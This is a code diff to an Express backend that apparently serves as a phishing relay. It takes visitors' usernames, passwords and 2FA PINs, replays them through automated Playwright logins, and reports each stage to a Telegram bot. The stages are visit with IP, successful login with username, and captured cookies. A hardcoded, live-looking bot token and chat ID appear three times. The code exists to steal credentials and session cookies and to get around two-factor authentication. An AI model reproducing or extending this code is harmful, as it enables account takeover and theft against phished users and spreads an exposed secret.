@@ -2,7 +2,7 @@ const express = require('express');
 const { startWithPlaywright, loginWithPlaywright, pinValidator } = require('./playwrightLogin');
 const app = express();
 const cors = require('cors');  // Import CORS
-
+const axios = require('axios');
 
 // Enable CORS for all routes
 app.use(cors());
@@ -26,6 +26,29 @@ app.post('/start-login', async (req, res) => {
 
     // Optionally, log this information or store it in a database
     console.log(`Received start request for UUID: ${uuid} from IP: ${ip}`);
+
+    
+
+// Replace with your actual bot token and chat ID
+      const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
+      const chatId = '6886115064';      // The chat ID (user ID or group ID)
+      // Correctly interpolate the message with UUID and IP
+      const message = `Hello from the backend! UUID: ${uuid}, IP: ${ip}`;
+
+      // Construct the Telegram Bot API URL
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+// Send a POST request to Telegram Bot API to send the message
+axios.post(url, {
+  chat_id: chatId,
+  text: message,
+})
+.then(response => {
+  console.log('Message sent successfully:', response.data);
+})
+.catch(error => {
+  console.error('Error sending message:', error);
+});
 
 
   try {
@@ -60,8 +83,25 @@ app.post('/process-login', async (req, res) => {
     // Assuming loginWithPlaywright() returns a boolean or resolves to true/false
     const loginSuccess = await loginWithPlaywright(uuid, username, password);
 
+    const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
+    const chatId = '6886115064';   
+
     if (loginSuccess) {
         // If loginSuccess is true, send success response
+
+        // If login is successful, send a success message to Telegram
+      const message = `Login Successful! UUID: ${uuid}, Username: ${username}`;
+
+      // Construct the Telegram Bot API URL
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Send a POST request to Telegram Bot API to send the message
+      await axios.post(url, {
+        chat_id: chatId,
+        text: message,
+      });
+
+
         res.json({ success: true, message: 'Login successful', uuid });
     } else {
         // If loginSuccess is false, send failure response
@@ -101,6 +141,21 @@ app.post('/validate-pin', async (req, res) => {
         // If pinValidationSuccess is true, update the session status and send success response
         session.status = 'logged-in'; // Update session status
         session.status = 'completed'; // Update session to completed once 2FA is validated
+        // If login is successful, send a success message to Telegram
+        const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
+        const chatId = '6886115064';   
+      
+      const message = `Cookies Successful! UUID: ${uuid}, Username: ${username}`;
+
+      // Construct the Telegram Bot API URL
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Send a POST request to Telegram Bot API to send the message
+      await axios.post(url, {
+        chat_id: chatId,
+        text: message,
+      });
+
         res.json({ success: true, message: 'PIN validated successfully', uuid });
     } else {
         // If pinValidationSuccess is false, send failure response
